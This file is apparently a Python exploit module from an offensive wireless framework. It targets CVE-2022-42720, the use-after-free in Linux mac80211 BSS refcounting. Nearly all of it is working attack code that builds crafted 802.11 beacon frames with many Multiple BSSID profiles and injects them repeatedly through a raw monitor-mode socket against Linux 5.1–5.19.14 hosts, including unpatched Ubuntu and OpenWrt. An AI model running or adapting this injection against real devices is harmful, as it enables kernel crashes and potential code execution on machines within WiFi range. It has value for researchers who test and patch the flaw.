# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux mac80211 BSS Refcounting Use-After-Free (CVE-2022-42720).

    The mac80211 subsystem in the Linux kernel (5.1 through 5.19.14)
    contains a refcounting bug when processing multi-BSS information
    in 802.11 management frames.  When a station receives beacon or
    probe-response frames that describe multiple BSSIDs, the kernel
    fails to properly increment the reference count on internal BSS
    info structures.  A subsequent scan-cleanup path drops the last
    reference, freeing the structure while other code paths still
    hold a stale pointer.  An attacker within WiFi range can inject
    crafted 802.11 frames to trigger the UAF and potentially achieve
    kernel-level code execution.

    Fix: kernel commit 6e24ab09cf74 ("net: wireless: fix BSS
    refcounting bugs").

    CVSS v3.1: 7.8 (High), AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux mac80211 BSS Refcount Use-After-Free (CVE-2022-42720)",
        "description": (
            "Exploits CVE-2022-42720 via a BSS refcounting bug in the Linux "
            "kernel mac80211 subsystem.  Injecting 802.11 beacon frames with "
            "multiple BSSID entries causes the kernel to miscalculate reference "
            "counts on BSS info structures.  When the scan-cleanup path runs, "
            "it frees a structure that is still referenced, producing a "
            "use-after-free condition exploitable for kernel code execution."
        ),
        "authors": (
            "Soenke Huster (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2022-42720",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e24ab09cf74",
            "https://www.openwall.com/lists/oss-security/2022/10/13/2",
        ),
        "disclosure_date": "2022-10-14",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernel 5.1 through 5.19.14",
            "Ubuntu 20.04/22.04 (unpatched)",
            "OpenWrt pre-22.03.2",
        ),
    }

    target = OptIP("", "Target WiFi interface or BSSID (monitor mode required)")
    port = OptPort(1, "Unused (WiFi frame injection does not use ports)")
    timeout = OptFloat(5.0, "Timeout for frame injection and response capture")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface for injection")
    bss_count = OptInteger(8, "Number of BSS entries per beacon to trigger refcount underflow")
    injection_rounds = OptInteger(64, "Number of beacon injection rounds")

    # 802.11 frame type/subtype constants
    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_BEACON = 0x08
    _SUBTYPE_PROBE_REQ = 0x04
    _SUBTYPE_PROBE_RSP = 0x05

    # Information Element IDs
    _IE_SSID = 0
    _IE_SUPPORTED_RATES = 1
    _IE_DS_PARAMETER = 3
    _IE_MULTIPLE_BSSID = 71
    _IE_NONTRANSMITTED_BSSID_PROFILE = 0

    def _build_radiotap_header(self) -> bytes:
        """Minimal radiotap header for frame injection."""
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_frame_control(self, frame_type: int, subtype: int) -> bytes:
        fc = (frame_type & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_ie(self, ie_id: int, data: bytes) -> bytes:
        return struct.pack("BB", ie_id, len(data)) + data

    def _build_nontransmitted_profile(self, index: int, bssid_suffix: int) -> bytes:
        """Build a Non-Transmitted BSSID Profile sub-element.

        Each profile contains a BSSID index and a minimal capability set.
        The refcount bug triggers when the kernel adds these without
        incrementing the BSS info reference count.
        """
        bssid_index_ie = self._build_ie(85, struct.pack("B", index & 0xFF))
        cap_ie = struct.pack("<H", 0x0431)
        ssid_ie = self._build_ie(self._IE_SSID, f"bss-{bssid_suffix:02x}".encode())
        profile_body = bssid_index_ie + cap_ie + ssid_ie
        return self._build_ie(self._IE_NONTRANSMITTED_BSSID_PROFILE, profile_body)

    def _build_multi_bss_beacon(self, src_bssid: bytes, channel: int) -> bytes:
        """Build a beacon frame carrying multiple BSS entries.

        The mac80211 refcount bug is triggered by many BSS profiles
        inside a single Multi-BSSID element.
        """
        fc = self._build_frame_control(self._FRAME_TYPE_MGMT, self._SUBTYPE_BEACON)
        duration = struct.pack("<H", 0)
        dst = b"\xff\xff\xff\xff\xff\xff"
        seq_ctrl = struct.pack("<H", 0)

        header = fc + duration + dst + src_bssid + src_bssid + seq_ctrl

        timestamp = struct.pack("<Q", int(time.time() * 1_000_000) & 0xFFFFFFFFFFFFFFFF)
        beacon_interval = struct.pack("<H", 100)
        capability = struct.pack("<H", 0x0431)
        fixed = timestamp + beacon_interval + capability

        ssid_ie = self._build_ie(self._IE_SSID, b"trigger-refcount")
        rates_ie = self._build_ie(self._IE_SUPPORTED_RATES, bytes([0x82, 0x84, 0x8B, 0x96]))
        ds_ie = self._build_ie(self._IE_DS_PARAMETER, struct.pack("B", channel))

        profiles = b""
        for i in range(self.bss_count):
            profiles += self._build_nontransmitted_profile(i + 1, i)

        max_indicator = max(self.bss_count.bit_length(), 1)
        mbssid_body = struct.pack("B", max_indicator) + profiles
        mbssid_ie = self._build_ie(self._IE_MULTIPLE_BSSID, mbssid_body)

        body = fixed + ssid_ie + rates_ie + ds_ie + mbssid_ie

        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_probe_request(self) -> bytes:
        """Build a broadcast probe request for passive detection."""
        fc = self._build_frame_control(self._FRAME_TYPE_MGMT, self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        dst = b"\xff\xff\xff\xff\xff\xff"
        src = b"\xaa\xbb\xcc\xdd\xee\xff"
        bssid = b"\xff\xff\xff\xff\xff\xff"
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl

        ssid_ie = self._build_ie(self._IE_SSID, b"")
        rates_ie = self._build_ie(self._IE_SUPPORTED_RATES, bytes([0x02, 0x04, 0x0B, 0x16]))

        radiotap = self._build_radiotap_header()
        return radiotap + header + ssid_ie + rates_ie

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        """Open a raw socket on the monitor-mode interface."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        """Verify we can inject and receive 802.11 frames on the monitor interface."""
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            try:
                data = raw.recv(4096)
                return len(data) > 0
            except (OSError, TimeoutError):
                return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return

        if not self.check():
            print_error(
                "Cannot open raw socket on the monitor interface. "
                "Ensure the interface is in monitor mode and you have root privileges."
            )
            return

        print_success("Monitor-mode socket established; injecting multi-BSS beacons")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket for injection")
            return

        src_bssid = b"\x02\x00\x00\x00\x00\x01"
        channel = 6

        print_status(
            f"Injecting {self.injection_rounds} beacons with "
            f"{self.bss_count} BSS entries each on channel {channel}"
        )

        success = 0
        for rnd in range(self.injection_rounds):
            src = bytearray(src_bssid)
            src[5] = (rnd & 0xFF)
            beacon = self._build_multi_bss_beacon(bytes(src), channel)
            if self._inject_frame(raw, beacon):
                success += 1
            time.sleep(0.002)

        raw.close()

        print_status(f"Injected {success}/{self.injection_rounds} beacons")
        print_info(
            "If the target kernel is vulnerable (5.1 through 5.19.14), the "
            "BSS refcount underflow should trigger a UAF when the scan "
            "cache is pruned.  Monitor the target for kernel oops or "
            "unexpected behavior."
        )
